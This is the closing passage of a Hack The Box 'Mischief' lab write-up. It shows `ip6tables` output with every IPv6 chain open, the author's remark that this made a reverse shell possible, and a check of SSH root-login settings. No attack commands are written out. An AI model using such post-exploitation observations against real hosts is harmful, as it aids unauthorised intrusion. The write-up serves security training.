+</span></pre></table></code></div></div><p>However, the IPv6 iptables is wide open for both ingress and egress. That was why we were able to do a reverse shell using it.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>ip6tables <span class="nt">-L</span>
+<span class="go">Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination  
+</span></pre></table></code></div></div><h3 id="ssh-root-user">SSH Root User</h3><p>I also checked the <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd.config</code> file and confirmed that the <code class="language-plaintext highlighter-rouge">root</code> user was not allowed to <code class="language-plaintext highlighter-rouge">SSH</code> with password.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Authentication:
+<span class="go">
+</span><span class="gp">#</span>LoginGraceTime 2m
+<span class="gp">#</span>PermitRootLogin prohibit-password    &lt;<span class="nt">--</span> Commendted
+<span class="gp">#</span>StrictModes <span class="nb">yes</span>
+<span class="gp">#</span>MaxAuthTries 6
+<span class="gp">#</span>MaxSessions 10
+</pre></table></code></div></div><p>Thanks for reading! :]</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/linux/'>Linux</a>, <a href='/categories/insane/'>Insane</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/mischief/" class="post-tag no-text-decoration" >mischief</a> <a href="/tags/snmp/" class="post-tag no-text-decoration" >SNMP</a> <a href="/tags/ipv6/" class="post-tag no-text-decoration" >IPv6</a> <a href="/tags/icmp/" class="post-tag no-text-decoration" >ICMP</a> <a href="/tags/systemd-run/" class="post-tag no-text-decoration" >systemd-run</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bigb0sss.github.io/posts/htb-mischief-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://twitter.com/intent/tweet?text=HTB - Mischief Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-mischief-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Mischief Write-up - bigb0ss&u=https://bigb0sss.github.io/posts/htb-mischief-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Mischief Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-mischief-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/redteam-rotate-ip-aws-gateway/">Rotating Source IPs (Part 1) - AWS API Gateway</a><li><a href="/posts/redteam-cobalt-strike-malleable-profile/">Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-teacher-writeup/"><div class="card-body"> <span class="timeago small" > Nov 22, 2020 <i class="unloaded">2020-11-22T10:25:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Teacher Write-up</h3><div class="text-muted small"><p> This one was an easy difficulty box. Good learning path for: Login Brute-forcing Moodle RCE - Math Formular Abuse MySQL DB Enum to Extract Password Privilege Escalation via Cronjob Initi...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder-writeup/"><div class="card-body"> <span class="timeago small" > Oct 24, 2020 <i class="unloaded">2020-10-24T11:25:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Blunder Write-up</h3><div class="text-muted small"><p> This box was pretty simple and easy one to fully compromise. Good learning path for: BLUDIT CMS 3.9.2 Brute-force Mitigation Bypass BLUDIT CMS 3.9.2 Directory Traversal Exploit CVE-2019-1428...</p></div></div></a></div><div class="card"> <a href="/posts/htb-cache-writeup/"><div class="card-body"> <span class="timeago small" > Oct 25, 2020 <i class="unloaded">2020-10-25T11:25:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Cache Write-up</h3><div class="text-muted small"><p> This was a medium-difficulty box and good learning path for: Client-side Auth Source Code Review VHOST Enumeration OpenEMR &lt; 5.0.1 - Multiple SQLi OpenEMR &lt; 5.0.1 - Authenticatd Remo...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-cache-writeup/" class="btn btn-outline-primary"><p>HTB - Cache Write-up</p></a> <a href="/posts/htb-tabby-writeup/" class="btn btn-outline-primary"><p>HTB - Tabby Write-up</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//bigb0ss-blog.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://bigb0sss.github.io/posts/htb-mischief-writeup/'; this.page.identifier = '/posts/htb-mischief-writeup/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://www.linkedin.com/in/danielsmin">bigb0ss</a>. <span data-toggle="tooltip" data-placement="top" title="CC BY 4.0 ">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://bigb0sss.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">[-] No result found</p>' }); </script>
